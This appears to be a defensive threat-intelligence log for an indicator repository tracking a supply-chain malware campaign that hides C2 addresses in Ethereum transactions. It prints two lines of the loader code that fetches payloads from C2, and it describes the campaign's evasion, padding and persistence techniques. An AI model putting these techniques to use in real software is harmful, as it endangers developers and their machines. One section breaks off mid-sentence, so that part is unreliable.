### SafeDep, 2026-09-30: the Ethereum dead drop, two wallets, 35 repositories

A malicious pull request against `oxc-project/oxc` on 2026-09-14 put the loader
into 20 build and test scripts. The maintainers did not merge it; an
`[autofix.ci]` formatter commit reflowed the one-line payload into 106 lines,
which is the only reason it was visible in the diff at all. From that one diff
SafeDep decoded every stage statically and walked the chain outward to **35
GitHub repositories still carrying the loader at `HEAD` on 2026-09-30**, with
7,578 stars and 2,884 forks between them. Four Creative Tim dashboard templates
in that set account for 1,773 forks.

The mechanism is the one this repository already knows as NullReceiver, with a
different chain and a second wallet:

- The loader asks three public Ethereum RPC endpoints for the current block
  number, rounds down to a multiple of 256, adds 3, and reads that block looking
  for a transaction whose sender contains a fixed 32-hex substring.
- The **recipient address** of that transaction is the payload: bytes 1–4 are an
  IPv4 address and bytes 5–6 a port, then a second pair at offset 7. The post
  shows the decode by hand — `c6 69 7f d2` is `198.105.127.210`, `01bb` is 443.
- Two operator wallets run this. `0x33ff3eda…9891` has posted every 256 blocks
  (~51 minutes) since 2026-06-23, 2,895 transactions. `0xa322E5f3…Ef1a` — the
  wallet already in `strong.txt` — posts every 1,000 blocks since 2026-07-25,
  491 transactions.
- Because every rotation is a transaction, the wallet history **is** the C2
  history. SafeDep decoded all of it: eleven servers across the two wallets,
  eight of them on AS149440 (Evoxt).

Three things about this bear on the current set, and all three are now fixed or
written down:

1. **`ioc/` had two of the eleven C2 addresses for the `0x33ff` branch and three
   of six for `0xa322`.** The chain had simply not been read back far enough by
   the sources previous entries used. All eight missing addresses are added.
2. **The `0xa322` wallet address in `strong.txt` is in the wrong case.** It was
   added on 2026-09-14 lowercased. `ioc/` is matched with `grep -F` and no `-i`,
   and the literal in an infected file is the checksummed mixed-case form —
   SafeDep prints `'0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a'.toLowerCase()`
   straight out of `postcss.config.js` in one victim repository. The existing
   entry has never matched a sample. Both forms are now carried.
3. **The first XOR key in `strong.txt` is a ten-character prefix of a
   sixteen-character key**, and this source settles the question the last entry
   could not. See below.

### The XOR-key question from 2026-09-28 is answered, and the answer is the other one

The 2026-09-28 entry read OpenSourceMalware's column-aligned table

```
XOR keys           q4FZkxX{!h,Sr3=@   y-p_>d$0B&@^1aQk
```

as two keys separated by the comma, could not tell whether the run of spaces in
the second belonged to the key or to the column alignment, and carried
`q4FZkxX{!h` — the longest unambiguous part of the first — plus the whole of the
second. That reasoning was sound given one column-aligned table. It was wrong
about where the boundary falls.

SafeDep prints the same pair as two arguments in source code:

```js
await rl(new URL(`http://${o}:443/0x/cls`), 'q4FZkxX{!h,Sr3=@', !1);
await rl(new URL(`http://${o}:443/0x/ls`),  'y-p_>d$0B&@^1aQk', !0);
```

and its own indicator CSV repeats it per path: `/0x/cls` → "Response XOR key
`q4FZkxX{!h,Sr3=@`", `/0x/ls` → "Response XOR key `y-p_>d$0B&@^1aQk`". The comma
is inside the first key, both keys are sixteen characters, and the run of spaces
in OpenSourceMalware's table was column alignment after all.

So `q4FZkxX{!h,Sr3=@` is added. The shorter `q4FZkxX{!h` is **kept, not
replaced**: it is a prefix of the full key, it still matches every sample the
full key matches, and it additionally covers a build that reuses only the first
half. The cost is one extra line of scanner output on a file that is already
`INFECTED`. **The 2026-09-28 entry stands as written and was not edited** — this
paragraph is the correction, and the comment above the two entries in
`ioc/strong.txt` records it where someone reading the data will see it.

### OpenSSF malicious-packages: the 55 package names

SafeDep mentions in passing that "the OpenSSF malicious-packages database has 70
records (68 npm and 2 PyPI) that contain `0xa322E5f3` or the `/0x/cls` path".
That database is a **public git repository on github.com**, which is reachable
from here, so it was cloned and searched rather than taken on trust. The search
returns **71 records — 69 npm, 2 PyPI — published between 2026-06-24 and
2026-10-04**, every one of them matching an indicator this repository already
carries.

Each record names its reporter: Amazon Inspector, GitHub Security Advisories, or
Kamil Mańkowski's `bad-packages` feed. The `pybitjs` record makes the
attribution explicit — "The payload and embedded IoCs are consistent with
campaigns attributed to Lazarus APT/PolinRider" — and cites the Deception.Pro
report as a reference, which is how that third source came to be read.

Two separations were done before anything was added, and both were mechanical
rather than judged:

- **Attacker-owned versus hijacked.** Every candidate was fetched from
  `registry.npmjs.org` or `pypi.org`. A package whose entire version history has
  been removed — `latest` absent, or the `0.0.1-security` placeholder npm
  substitutes — is one the registry treats as wholly malicious. A package with a
  real `latest` and years of history is a hijacked victim, and for those the name
  alone is not a finding, so they go in as comments with their versions. That
  split put nine packages on the comment side, including three
  (`@kolbo/mcp`, 265 versions, latest `1.107.2`; and `@syncraft-labs/core`,
  `/react`, `/vue`) that are **still live on npm with a later clean release**.
- **The substring trap.** `bad-packages.txt` is matched with `grep -F`, so a name
  that is a prefix of a real package reports every project depending on the real
  one as `INFECTED`. Each candidate was run through npm's search API, and every
  superstring it returned was then fetched directly to see whether it was a live
  maintained project or a placeholder. That caught five, listed under
  *considered and not added*. This is the first week this check has been done
  mechanically instead of by eye; see the notes.

Fifty-five names survived both filters and are added.

### Deception.Pro, 2026-09-09: a honeypot with an operator in it

Published inside the 2026-09-14 window and missed by that sweep. It records an
operator working interactively on an infected host for about 167 hours:
installing Python 3.14 machine-wide, pulling clipboard-theft and screen-capture
dependencies with `pip`, laying down three separate persistence mechanisms, and
exfiltrating over HTTP POST with rotating user agents.

**This is a source no previous entry has used, and I had no prior basis for
trusting it.** It is carried because it is corroborated twice over, from
directions it could not have arranged:

- its loader C2, `23.27.13.135`, is independently confirmed by SafeDep as the
  `0xa322` C2 for 2026-08-22 to 2026-08-27 — a window the report could not have
  known from any other published source, because SafeDep is the first to decode
  the rotation; and
- the OpenSSF record for `pybitjs`, written by Amazon Inspector and
  Kamil Mańkowski, cites this report as one of its references.

Its contribution is the **Windows hands-on-keyboard stage**, which `ioc/` had
nothing on: a `%TEMP%` stager pair and a VBS run from both a scheduled task and
a Startup entry, under a name that impersonates the .NET native-image service.
Four indicators from it are added — two filenames, one C2 address and one
file-host string — and everything else it publishes is turned away below. A
maintainer who does not want to rely on this source can drop exactly those four
lines: each sits in its own commented block naming it.

### Episode 23, 2026-10-02: the fake font drops the font extension

The only post inside this week's window is a podcast episode, and it is not
nothing. Two weeks after the A/B-testing analysis, the hosts report that the
same payload has been given **a `.llf` extension**, which has nothing to do with
fonts, and that they counted **over 120 versions of it live on GitHub on
2026-09-28**. The repository one of them was researching was force-pushed and
overwritten between a Friday-night blog post and the Monday morning, changing
the file type — the rotation observed in real time, in the window between
publication and promotion.

Two things follow:

- **This is the first current-variant font indicator the set can carry.** The
  2026-09-28 entry rejected `fa-solid-900.woff2` because that is a genuine Font
  Awesome filename and `filenames.txt` is `INFECTED` tier with no weaker path
  tier. `.llf` does not have that problem: Font Awesome ships `.woff2`, `.woff`,
  `.ttf`, `.eot` and `.svg`, and no legitimate project names an `.llf` after a
  font weight. `filenames.txt` is already extended regex, which has been true all
  along and which no previous entry has used for this vector, so the weight can
  be a character class instead of a guess.
- **The source is a spoken transcript, and the filename is stated across two
  sentences** — "they're keeping the front of the file name basically the same,
  so `fa-solid-` fill in a number", then "the one that I saw was 300, but instead
  of `.woff2` it's a `.llf`". No single literal is printed anywhere on the page.
  That is a reason to carry the pattern rather than a specific name, not a reason
  to carry nothing: every element of the regex is stated explicitly, and the
  number is the part the source says rotates.

The episode also mentions, as history rather than as a current finding, that
earlier sub-variants used **fake `.dic` dictionary files** and that those older
forms are "coming back". Nothing is added for that; see below.

**The six heartbeat recipient addresses, and the four funder wallets.**
`0xc6697fd201BB2d89C685005000FF68cE430F572A` and its five predecessors are the
transaction recipients the C2 addresses are decoded *from*; `0xd31A213E…`,
`0x76D6dDCB…`, `0x4E5B2e1d…` and `0x96C8e62C…` funded the two operator wallets.

`0x4E5B2e1d…` is additionally described as a high-volume wallet, which is a
false-positive risk on top. The decoded **IP addresses** are what reaches
`network.txt`, and they are all there.

`strong.txt` already notes the plaintext joke in its NullReceiver comment.

**`X: 33ff3edaf55a8e03dcbc7cb40d498a49:5-841-du`.** A request header assembled at

**The five published SHA-256 hashes** — `02b7e072…`, `84a3f1bd…`, `5cbcb8e1…`,

This is the fourth consecutive week real published hashes have been turned away,

worth a maintainer's attention; the string is not an indicator.

**`global._p_t`, `_H2`, `_t_s`, `_t_u`, and `_$_xxxx=(function(`.** The 30-second

## New techniques — maintainer decisions, not implemented

Nothing below is implemented. The first three are the ones that would change
what this repository can detect.

1. **An AS-level network tier.** Eight of the eleven C2 servers across both
   wallets are on AS149440 (Evoxt), and the addresses rotate roughly weekly —
   `network.txt` gained seven addresses this week that were current for between
   three and eighteen days each. The file's own header already says "IP
   addresses rotate: block them, do not rely on them", and this week is the
   measurement that proves it. An AS or CIDR tier would be stable where the
   addresses are not. It is also the one piece of this that is useful *without*
   the scanner: an egress policy can block an AS.
2. **The `\u`-escape problem, which defeats fixed-string matching outright.** The
   `0xa322` loader is plain JavaScript written with Unicode escapes; SafeDep had
   to convert them before any of its strings were legible. That means
   `global.i="A8-`, `global.i = 'A8`, the wallet addresses and the XOR keys —
   the better half of `strong.txt` — do not match the raw bytes of a file in that
   family, whatever their case. Nothing in `ioc/` can fix this, because the
   problem is not which string to match but that the file does not contain the
   string. What would fix it is a normalisation pass before matching: decode
   `\uXXXX` and `\xNN` escapes in a copy of the candidate file and scan that too.
   This is the highest-value code change this review has identified, and it is
   not a one-line one.
3. **The regex content tier, and the weak path tier.** Fourth and fifth
   consecutive week respectively. This week they would have let in
   `_$_[0-9a-f]{4}=\(function` (which is one of the two expressions SafeDep
   recommends), `node .*fa-solid-[0-9]{3}\.woff2` from last week, and
   `~/.node_modules`, `/tmp/.pip` and `clr_init.vbs` as paths worth a look rather
   than a verdict.
4. **A long-line check.** SafeDep's first recommended hunt is not a string at
   all: `grep -rnE '.{1000,}'` over `.js`, `.mjs`, `.cjs` and `.ts`. The payload
   in the oxc commit sits after 2,000 space characters on the last line of each
   of 20 files, and the September fake-font builds pad with 273 and 421 tabs.
   This is content-independent, survives every rotation this campaign has shown,
   and `ci/scan-workspace.sh` does not do it. Cheap to add and it does not touch
   `ioc/` at all.
5. **An author/committer mismatch check.** SafeDep's third hunt is
   `git log --format='%h|%an|%cn|%ad|%cd' | awk -F'|' '$2 != $3'`, and the oxc
   commit is the illustration: author an oxc maintainer dated 2026-07-16,
   committer the attacker account dated 2026-09-25, ten weeks apart, message
   describing a real benchmark change. `AGENTS.md` already warns that git history
   cannot be trusted to decide whether a branch is clean — this is the
   *positive* form of that warning, a fingerprint rather than an absence, and it
   matches what the 2026-09-28 entry recorded from the activity API (814 of 853
   force-pushes rewrote only the tip with the same parent and author date).
6. **WSL2 guest-to-host crossing.** When `os.release()` contains
   `microsoft-standard-WSL2` the loader starts `node.exe` as well as `node`, so
   an infection contained in a Linux guest reaches the Windows host. The local
   checks are split by operating system and `check-linux.sh` has no reason today
   to care about Windows paths. A developer running WSL2 needs both checks, and
   nothing currently says so.
7. **Python as a second runtime.** The stage-4 script installs Python (on Windows
   from `python.7z` and `7zr.exe`) and `pip` from `bootstrap.pypa.io`, then runs a
   detached Python stager. The Deception.Pro capture shows the same thing from the
   other side: Python 3.14 installed machine-wide, clipboard and screen-capture
   dependencies pulled in. Every implant check in this repository looks for a
   Node binary or a Node process. A `.pth` file — which is how the `pybitjs`
   package re-executes on *every* Python interpreter start — is a persistence
   mechanism with no coverage here at all, and it is quieter than anything on the
   Node side.
8. **A cross-ecosystem manifest check.** Two of this week's names are PyPI
   packages and one earlier compromise is a Packagist branch. `bad-packages.txt`
   is a flat list of names with no ecosystem column, which is adequate for
   `grep -F` and inadequate for the whole-name check that gaps 1 and 3 of the
   standing list both need.
